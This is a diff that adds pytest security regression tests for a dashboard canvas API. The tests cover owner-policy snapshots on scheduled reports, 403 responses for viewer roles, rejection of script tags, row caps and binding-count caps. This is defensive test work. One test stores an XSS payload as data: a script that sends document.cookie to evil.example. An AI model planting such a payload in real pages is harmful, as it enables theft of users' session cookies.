@@ -790,3 +790,490 @@ class TestCollectCanvasData:
             canvas=canvas_row,
         )
         assert result == {}
+
+
+# ---------------------------------------------------------------------------
+# 7. Security regression tests
+# ---------------------------------------------------------------------------
+
+
+@pytest_asyncio.fixture
+async def canvas_client_with_viewer(app, fake_db):
+    """HTTPX async client with a member user + a viewer user, both in separate orgs."""
+    repo = InMemoryRepo()
+    set_repo(repo)
+
+    # Owner/member user
+    owner_id = str(uuid.uuid4())
+    owner_org_id = str(uuid.uuid4())
+    fake_db.users[owner_id] = {
+        "id": owner_id,
+        "email": "owner@example.com",
+        "name": "Owner",
+        "avatar_url": None,
+        "email_verified": True,
+        "created_at": "2024-01-01T00:00:00+00:00",
+    }
+    repo.seed_org_member(org_id=owner_org_id, user_id=owner_id, role="owner")
+
+    # Viewer user in their own org
+    viewer_id = str(uuid.uuid4())
+    viewer_org_id = str(uuid.uuid4())
+    fake_db.users[viewer_id] = {
+        "id": viewer_id,
+        "email": "viewer@example.com",
+        "name": "Viewer",
+        "avatar_url": None,
+        "email_verified": True,
+        "created_at": "2024-01-01T00:00:00+00:00",
+    }
+    repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="viewer")
+
+    transport = ASGITransport(app=app)
+    async with AsyncClient(
+        transport=transport,
+        base_url="http://testserver",
+        follow_redirects=False,
+    ) as ac:
+        yield ac, owner_id, owner_org_id, viewer_id, viewer_org_id, repo
+
+    set_repo(None)
+
+
+class TestCanvasSecurityRegressions:
+    """Regression tests for the three confirmed security findings.
+
+    Finding 1 (CRITICAL RLS): schedule endpoint must snapshot owner policies.
+    Finding 2 (MED RBAC):     viewer is 403 on create/update/delete/schedule.
+    Finding 3 (MED safety):   PUT rejects HTML with a <script> tag.
+    """
+
+    # ── Finding 1: Schedule snapshots owner policies ─────────────────────────
+
+    @pytest.mark.asyncio
+    async def test_schedule_snapshots_owner_policies_onto_flow_spec(
+        self, canvas_client_with_viewer, fake_db
+    ):
+        """POST /canvases/{id}/schedule stores __owner_policies__ in flow spec.
+
+        Regression for CRITICAL RLS finding: without this snapshot the scheduled
+        report_send would render with claims=None → all tenant rows leak to
+        recipients. The snapshot is read back from the flow store after creation.
+        """
+        from app.flows.store import get_flow_store
+        from app.routes.flows import OWNER_POLICIES_KEY
+
+        client, owner_id, _owner_org, *_ = canvas_client_with_viewer
+
+        # Create a canvas first.
+        create_resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Scheduled Canvas"},
+            headers=_auth_headers(owner_id),
+        )
+        assert create_resp.status_code == 201, create_resp.text
+        canvas_id = create_resp.json()["id"]
+
+        # Schedule the canvas.
+        sched_resp = await client.post(
+            f"/api/v1/canvases/{canvas_id}/schedule",
+            json={"recipients": ["alice@example.com"], "format": "html"},
+            headers=_auth_headers(owner_id),
+        )
+        assert sched_resp.status_code == 201, sched_resp.text
+        flow_id = sched_resp.json()["flow_id"]
+
+        # The persisted flow spec MUST have runtime_config[OWNER_POLICIES_KEY].
+        store = get_flow_store()
+        flow = await store.get_flow(flow_id)
+        assert flow is not None, "Flow not found in store."
+        spec = flow.get("spec") or {}
+        runtime_config = spec.get("runtime_config") or {}
+        assert OWNER_POLICIES_KEY in runtime_config, (
+            f"__owner_policies__ missing from flow spec runtime_config. "
+            f"spec keys: {list(spec.keys())}, runtime_config: {runtime_config}"
+        )
+        # The snapshot value must be a dict (even if empty for an unscoped owner).
+        assert isinstance(runtime_config[OWNER_POLICIES_KEY], dict)
+
+    # ── Finding 2: Viewer is 403 on all mutating endpoints ───────────────────
+
+    @pytest.mark.asyncio
+    async def test_viewer_cannot_create_canvas(self, canvas_client_with_viewer):
+        """Viewer role is forbidden (403) from POST /canvases."""
+        client, _owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer
+
+        resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Viewer Canvas"},
+            headers=_auth_headers(viewer_id),
+        )
+        assert resp.status_code == 403, resp.text
+
+    @pytest.mark.asyncio
+    async def test_viewer_cannot_update_canvas(self, canvas_client_with_viewer, fake_db):
+        """Viewer role is forbidden (403) from PUT /canvases/{id}."""
+        client, owner_id, _owner_org, viewer_id, viewer_org_id, repo = canvas_client_with_viewer
+
+        # Create a canvas as the owner.
+        create_resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Owner Canvas"},
+            headers=_auth_headers(owner_id),
+        )
+        assert create_resp.status_code == 201
+        canvas_id = create_resp.json()["id"]
+
+        # Viewer cannot update (even their own org — viewer_org has no canvas here,
+        # but the 403 fires before the 404 because the writer guard runs first).
+        resp = await client.put(
+            f"/api/v1/canvases/{canvas_id}",
+            json={"name": "Hijacked Name"},
+            headers=_auth_headers(viewer_id),
+        )
+        assert resp.status_code == 403, resp.text
+
+    @pytest.mark.asyncio
+    async def test_viewer_cannot_delete_canvas(self, canvas_client_with_viewer):
+        """Viewer role is forbidden (403) from DELETE /canvases/{id}."""
+        client, owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer
+
+        # Create a canvas as the owner.
+        create_resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Owner Canvas"},
+            headers=_auth_headers(owner_id),
+        )
+        assert create_resp.status_code == 201
+        canvas_id = create_resp.json()["id"]
+
+        resp = await client.delete(
+            f"/api/v1/canvases/{canvas_id}",
+            headers=_auth_headers(viewer_id),
+        )
+        assert resp.status_code == 403, resp.text
+
+    @pytest.mark.asyncio
+    async def test_viewer_cannot_schedule_canvas(self, canvas_client_with_viewer):
+        """Viewer role is forbidden (403) from POST /canvases/{id}/schedule."""
+        client, owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer
+
+        # Create a canvas as the owner.
+        create_resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Owner Canvas"},
+            headers=_auth_headers(owner_id),
+        )
+        assert create_resp.status_code == 201
+        canvas_id = create_resp.json()["id"]
+
+        resp = await client.post(
+            f"/api/v1/canvases/{canvas_id}/schedule",
+            json={"recipients": ["viewer@example.com"]},
+            headers=_auth_headers(viewer_id),
+        )
+        assert resp.status_code == 403, resp.text
+
+    @pytest.mark.asyncio
+    async def test_viewer_can_still_get_canvas(self, canvas_client_with_viewer, fake_db):
+        """GET endpoints remain accessible to viewers (read-only is fine).
+
+        We create a canvas as the viewer (by temporarily granting owner role) then
+        downgrade to viewer to assert they can still list/get. This avoids the
+        org-resolution ambiguity of seeding a user into multiple orgs.
+        """
+        client, _owner_id, _owner_org, viewer_id, viewer_org_id, repo = canvas_client_with_viewer
+
+        # Temporarily grant owner so the create succeeds.
+        repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="owner")
+
+        create_resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Readable Canvas"},
+            headers=_auth_headers(viewer_id),
+        )
+        assert create_resp.status_code == 201
+        canvas_id = create_resp.json()["id"]
+
+        # Downgrade back to viewer.
+        repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="viewer")
+
+        # Viewer can GET the canvas list and the specific canvas.
+        list_resp = await client.get("/api/v1/canvases", headers=_auth_headers(viewer_id))
+        assert list_resp.status_code == 200
+
+        get_resp = await client.get(
+            f"/api/v1/canvases/{canvas_id}", headers=_auth_headers(viewer_id)
+        )
+        assert get_resp.status_code == 200
+
+    # ── Finding 3: PUT rejects docs with script tags ─────────────────────────
+
+    @pytest.mark.asyncio
+    async def test_put_rejects_doc_with_script_tag(self, canvas_client_with_viewer):
+        """PUT /canvases/{id} must 400 when config.doc contains a <script> tag.
+
+        Regression for MED safety finding: without this check a writer can
+        store XSS payloads in the canvas config that are later rendered.
+        """
+        client, owner_id, *_ = canvas_client_with_viewer
+
+        # Create a clean canvas first.
+        create_resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Safe Canvas"},
+            headers=_auth_headers(owner_id),
+        )
+        assert create_resp.status_code == 201, create_resp.text
+        canvas_id = create_resp.json()["id"]
+
+        # Attempt to update with a doc containing a <script> tag.
+        xss_doc = {
+            "version": 1,
+            "title": "XSS attempt",
+            "html": '<div><script>fetch("https://evil.example/steal?c="+document.cookie)</script></div>',
+            "bindings": {},
+        }
+        resp = await client.put(
+            f"/api/v1/canvases/{canvas_id}",
+            json={"config": {"doc": xss_doc}},
+            headers=_auth_headers(owner_id),
+        )
+        assert resp.status_code == 400, resp.text
+        body = resp.json()
+        # AppError serialises as {"error": {"code": ..., "message": ...}}
+        error_code = body.get("code") or (body.get("error") or {}).get("code")
+        assert error_code == "invalid_canvas_doc", body
+
+    @pytest.mark.asyncio
+    async def test_put_allows_valid_doc(self, canvas_client_with_viewer):
+        """PUT /canvases/{id} accepts a config.doc that passes validation."""
+        client, owner_id, *_ = canvas_client_with_viewer
+
+        create_resp = await client.post(
+            "/api/v1/canvases",
+            json={"name": "Canvas"},
+            headers=_auth_headers(owner_id),
+        )
+        assert create_resp.status_code == 201
+        canvas_id = create_resp.json()["id"]
+
+        valid_doc = {
+            "version": 1,
+            "title": "Safe",
+            "html": '<div><nubi-kpi data-el-id="el1"></nubi-kpi></div>',
+            "bindings": {},
+        }
+        resp = await client.put(
+            f"/api/v1/canvases/{canvas_id}",
+            json={"config": {"doc": valid_doc}},
+            headers=_auth_headers(owner_id),
+        )
+        assert resp.status_code == 200, resp.text
+
+
+# ---------------------------------------------------------------------------
+# 7. Regression: row-cap and binding-count caps (security findings)
+# ---------------------------------------------------------------------------
+
+
+class TestCanvasCapRegression:
+    """Regression tests for the OOM row-cap and binding-count-cap fixes."""
+
+    # ── 7a. API binding result is row-capped (HIGH OOM fix) ─────────────────
+
+    @pytest.mark.asyncio
+    async def test_api_binding_result_is_row_capped(self):
+        """API/flow-provider binding: to_pylist() result is truncated to _ROW_CAP rows.
+
+        Regression for the HIGH OOM finding: the api branch in collect_canvas_data
+        previously called result_table.to_pylist() with NO row cap, unlike the
+        query/metric branches which go through run_query_rows (which enforces
+        _ROW_CAP).  The fix truncates rows_raw to _ROW_CAP after to_pylist().
+        """
+        import types
+
+        from app.dashboards.collect import collect_canvas_data, _ROW_CAP  # noqa: PLC0415
+
+        repo = InMemoryRepo()
+        org_id = str(uuid.uuid4())
+        user_id = str(uuid.uuid4())
+        repo.seed_org_member(org_id=org_id, user_id=user_id)
+
+        canvas = await repo.create(
+            "canvases",
+            org_id=org_id,
+            created_by=user_id,
+            name="API OOM Canvas",
+            config={
+                "doc": {
+                    "version": 1,
+                    "html": '<nubi-value data-el-id="el_api"></nubi-value>',
+                    "bindings": {
+                        "el_api": {
+                            "kind": "api",
+                            "connector_id": "conn-xyz",
+                            "path": "/data",
+                        },
+                    },
+                }
+            },
+        )
+
+        # Build a fake Arrow-like table with _ROW_CAP + 10 rows.
+        over_cap = (_ROW_CAP if _ROW_CAP > 0 else 100_000) + 10
+        fake_rows = [{"value": i} for i in range(over_cap)]
+
+        class _FakeTable:
+            schema = types.SimpleNamespace(names=["value"])
+
+            def to_pylist(self):
+                return list(fake_rows)
+
+        class _FakeConnector:
+            def execute(self, plan):
+                return _FakeTable()
+
+            def capabilities(self):
+                return {}
+
+            def close(self):
+                pass
+
+        fake_connector = _FakeConnector()
+
+        with (
+            patch(
+                "app.dashboards.collect._resolve_connector",
+                new=AsyncMock(return_value=(fake_connector, False)),
+            ),
+            patch(
+                "app.connectors.plan",
+                return_value=types.SimpleNamespace(rls_claims={}),
+            ),
+        ):
+            result = await collect_canvas_data(
+                canvas_id=canvas["id"],
+                org_id=org_id,
+                claims={},
+                repo=repo,
+            )
+
+        assert "el_api" in result
+        entry = result["el_api"]
+        assert "error" not in entry, f"Unexpected error: {entry.get('error')}"
+        cap = _ROW_CAP if _ROW_CAP > 0 else 100_000
+        assert len(entry["rows"]) == cap, (
+            f"Expected rows truncated to {cap}, got {len(entry['rows'])}"
+        )
+
+    # ── 7b. Canvas with >500 bindings is rejected at parse (max_length=500) ─
+
+    def test_canvas_doc_with_501_bindings_rejected_at_parse(self):
+        """CanvasDoc.bindings has max_length=500; 501 entries must be rejected.
+
+        Regression for the LOW resource finding: without max_length=500 on the
+        Field, an attacker could craft a canvas doc with arbitrarily many bindings
+        and force the server to spawn one coroutine per binding with no upper bound.
+        """
+        from pydantic import ValidationError  # noqa: PLC0415
+
+        bindings = {
+            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
+            for i in range(501)
+        }
+        with pytest.raises(ValidationError) as exc_info:
+            CanvasDoc.model_validate(
+                {
+                    "version": 1,
+                    "title": "Too Many Bindings",
+                    "html": "<div></div>",
+                    "bindings": bindings,
+                }
+            )
+        # Confirm the error is about the bindings dict length.
+        err_str = str(exc_info.value)
+        assert "bindings" in err_str.lower() or "500" in err_str, (
+            f"Unexpected validation error: {err_str}"
+        )
+
+    def test_canvas_doc_with_exactly_500_bindings_accepted(self):
+        """CanvasDoc.bindings accepts exactly 500 entries (boundary check)."""
+        bindings = {
+            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
+            for i in range(500)
+        }
+        doc = CanvasDoc.model_validate(
+            {
+                "version": 1,
+                "title": "Max Bindings",
+                "html": "<div></div>",
+                "bindings": bindings,
+            }
+        )
+        assert len(doc.bindings) == 500
+
+    # ── 7c. collect_canvas_data caps bindings at _MAX_CANVAS_BINDINGS ────────
+
+    @pytest.mark.asyncio
+    async def test_collect_caps_bindings_at_max_canvas_bindings(self):
+        """collect_canvas_data truncates bindings to _MAX_CANVAS_BINDINGS before gather.
+
+        Even if a raw canvas doc dict (bypassing Pydantic) somehow has >500
+        bindings (e.g. legacy data), the collector must not fan-out more than
+        _MAX_CANVAS_BINDINGS coroutines.
+        """
+        from app.dashboards.collect import collect_canvas_data, _MAX_CANVAS_BINDINGS  # noqa: PLC0415
+
+        repo = InMemoryRepo()
+        org_id = str(uuid.uuid4())
+        user_id = str(uuid.uuid4())
+        repo.seed_org_member(org_id=org_id, user_id=user_id)
+
+        max_b = _MAX_CANVAS_BINDINGS if _MAX_CANVAS_BINDINGS > 0 else 500
+        over_max = max_b + 5
+
+        # Build raw bindings dict with over_max entries.
+        raw_bindings = {
+            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
+            for i in range(over_max)
+        }
+
+        canvas = await repo.create(
+            "canvases",
+            org_id=org_id,
+            created_by=user_id,
+            name="Oversized Bindings Canvas",
+            config={
+                "doc": {
+                    "version": 1,
+                    "html": "<div></div>",
+                    "bindings": raw_bindings,
+                }
+            },
+        )
+
+        call_count = 0
+
+        async def _mock_run_query_rows(query_id, org_id, repo, policies):
+            nonlocal call_count
+            call_count += 1
+            return (["v"], [[call_count]])
+
+        with patch(
+            "app.dashboards.collect.run_query_rows",
+            new=AsyncMock(side_effect=_mock_run_query_rows),
+        ):
+            result = await collect_canvas_data(
+                canvas_id=canvas["id"],
+                org_id=org_id,
+                claims={},
+                repo=repo,
+            )
+
+        assert len(result) == max_b, (
+            f"Expected at most {max_b} binding results, got {len(result)}"
+        )
+        assert call_count == max_b, (
+            f"Expected exactly {max_b} run_query_rows calls, got {call_count}"
+        )
